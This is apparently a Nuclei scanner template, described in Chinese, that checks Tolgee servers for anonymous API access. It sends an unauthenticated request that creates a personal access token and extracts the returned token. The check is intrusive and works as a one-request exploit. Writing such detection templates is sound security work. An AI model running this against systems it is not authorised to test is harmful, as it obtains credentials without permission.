id: tolgee-api-anonymous

info:
  name: Tolgee API 配置不当 匿名 访问
  author: matejsmycka
  severity: medium
  description: |
    检测到 Tolgee API 配置不当 匿名 访问。目标功能在未认证状态下可访问，可能暴露管理入口、业务数据、系统状态或可执行操作，需确认是否存在访问控制缺失。
  reference:
    - https://docs.tolgee.io/api
  metadata:
    max-request: 1
    verified: true
    shodan-query: html:"tolgee"
  tags: api,tolgee,misconfig,intrusive,vuln

variables:
  string: "{{to_lower('{{randstr}}')}}"

http:
  - raw:
      - |
        POST /v2/pats HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip

        {"description":"{{string}}"}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '{"token":'
          - '"createdAt"'
        condition: and

      - type: word
        part: content_type
        words:
          - application/hal+json

      - type: status
        status:
          - 201

    extractors:
      - type: regex
        part: body
        regex:
          - '"token"\s*:\s*"([^"]+)"'
